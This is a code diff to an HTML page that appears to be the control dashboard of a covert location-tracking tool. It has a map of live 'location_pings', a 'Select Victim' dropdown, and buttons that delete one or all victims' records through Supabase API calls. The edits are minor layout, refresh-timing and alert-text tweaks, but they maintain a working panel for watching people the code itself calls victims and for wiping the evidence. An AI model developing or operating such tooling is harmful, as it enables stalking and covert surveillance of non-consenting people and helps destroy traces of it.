@@ -7,12 +7,12 @@
   <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
   <style>
     body { margin:0; background:#111; color:#0f0; font-family:Arial; }
-    #map { height:60vh; width:100%; }
+    #map { height:65vh; width:100%; }
     .controls { padding:15px; background:#1a1a1a; text-align:center; }
     select, button { padding:12px; margin:5px; font-size:16px; }
     .delete-victim { background:#c00; color:white; font-weight:bold; }
     .delete-all { background:#900; color:white; font-weight:bold; padding:14px 25px; }
-    .activity { padding:15px; background:#1a1a1a; max-height:200px; overflow-y:auto; }
+    .activity { padding:15px; background:#1a1a1a; max-height:220px; overflow-y:auto; }
     .log { padding:10px; margin:5px 0; background:#222; }
   </style>
 </head>
@@ -21,7 +21,7 @@
   
   <div class="controls">
     <strong>Select Victim: </strong>
-    <select id="victimSelect" onchange="loadSelectedVictim()" style="width:380px;"></select>
+    <select id="victimSelect" onchange="loadSelectedVictim()" style="width:420px;"></select>
     <button class="delete-victim" onclick="deleteCurrentVictim()">🗑 Delete This Victim</button>
     <button class="delete-all" onclick="deleteAllVictims()">☠️ DELETE ALL VICTIMS</button>
   </div>
@@ -110,7 +110,7 @@
 
       alert("Victim deleted!");
       currentVictimId = "";
-      loadVictimsList();
+      await loadVictimsList();
       loadLiveData();
       loadActivityLog();
     }
@@ -121,21 +121,23 @@
       await fetch(`${SUPABASE_URL}/rest/v1/location_pings`, { method: "DELETE", headers: { "apikey": SUPABASE_KEY }});
       await fetch(`${SUPABASE_URL}/rest/v1/sharing_sessions`, { method: "DELETE", headers: { "apikey": SUPABASE_KEY }});
 
-      alert("ALL VICTIMS DELETED!");
+      alert("✅ ALL VICTIMS DELETED SUCCESSFULLY!");
+
       currentVictimId = "";
-      loadVictimsList();
+      await loadVictimsList();     // Refresh dropdown
       loadLiveData();
       loadActivityLog();
     }
 
-    // Auto refresh
+    // Initial Load
     loadVictimsList();
     loadLiveData();
     loadActivityLog();
+
     setInterval(() => {
       if (currentVictimId) loadLiveData();
       loadActivityLog();
-    }, 5000);
+    }, 4000);
   </script>
 </body>
 </html>
